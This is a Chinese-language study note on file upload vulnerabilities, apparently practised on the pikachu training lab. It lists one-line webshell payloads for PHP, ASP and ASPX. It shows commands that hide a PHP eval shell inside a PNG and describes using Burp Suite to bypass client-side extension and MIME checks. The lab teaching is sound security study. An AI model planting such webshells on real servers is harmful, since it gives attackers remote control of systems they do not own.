# 文件上传

服务器对上传文件的后缀和类型没有严格的过滤限制，导致攻击者能任意上传恶意脚本文件并执行，攻击者可通过该恶意文件实现访问控制整个后台

## 一、一句话木马

一句话木马的核心原理是利用脚本语言的动态执行函数，执行攻击者通过HTTP请求传递的指令，常用于攻击者实现对目标服务器的远程控制。一句话木马对应不同的脚本语言有不同的典型结构

| 脚本语言 | 基础语法                                      |
| -------- | --------------------------------------------- |
| PHP      | \<?php eval($_POST['cmd']); ?\>               |
| ASP      | \<%eval request("cmd")%\>                     |
| ASPX     | \<%Page Language="Jscript"%\> \<%eval(...)%\> |

一句话木马的编写相对简单，问题在于如何将木马文件上传到服务端、如何利用木马文件实现远程控制

## 二、文件上传漏洞

文件上传漏洞基于一句话木马漏洞，将木马文件上传到目标后通过自动化工具实现对目标的远程控制、文件管理等，在pikachu漏洞练习平台上暂时仅测试了两种检测方式，一种通过前端检测上传文件后缀名、一种通过检测文件MIME媒体类型。两者检测原理不同，但需要修改的操作类似，仅演示一种操作

1. 组合木马文件和图片文件

   图片文件自行准备。直接使用木马文件上传极易被过滤，大部分时候都需要将木马伪装成其他类型的正常文件，比如图片。图片文件最好准备一些简易的低清小图片，高清图片的内容太多，自动化工具可能会找不到木马语句

   ```cmd
   # 编写木马文件
   copy con pika.php
   <?php eval($_POST['hebor']); ?>
   ^Z
   
   # 组合木马文件和图片文件
   copy /b pika.php + pika.png pikapi.png
   ```

2. 通过pikachu平台测试文件上传；文件上传前需要启用burpsuite抓包

   ![客户端检查-1](image\文件上传\客户端检查-1.png)

3. 通过burpsuite的重放器进行处理

   通过浏览器上传文件时，前端会对文件后缀名进行检测，这种情况下木马文件会直接被前端拦截，因此首先需要修改文件后缀名来绕过前端检测。但即便以`.jpg`文件格式转发到目标了，PHP无法对`.jpg`文件进行解析，木马语句也就成了摆设。因此，在绕过前端拦截后，需要通过抓包将数据拦截在burpsuite上，然后通过burpsuite的重放器对数据进行修改后测试转发

   ![客户端检查-1](image\文件上传\客户端检查-2.png)

   通过重放器修改文件后缀类型后，有3种方式确认文件是否上传成功，除了上述2种方式以外，还可以在浏览器中直接访问木马文件，检查是否能直接管观察到文件内容

   ![客户端检查-3](image\文件上传\客户端检查-3.png)

4. 使用自动化工具尝试连接木马

   ![客户端检查-4](image\文件上传\客户端检查-4.png)

通过burpsuite修改文件名称、媒体类型是最简单的枚举操作，文件上传漏洞的枚举远不止这两种

![文件上传思路导图](image\文件上传\文件上传思路导图.png)

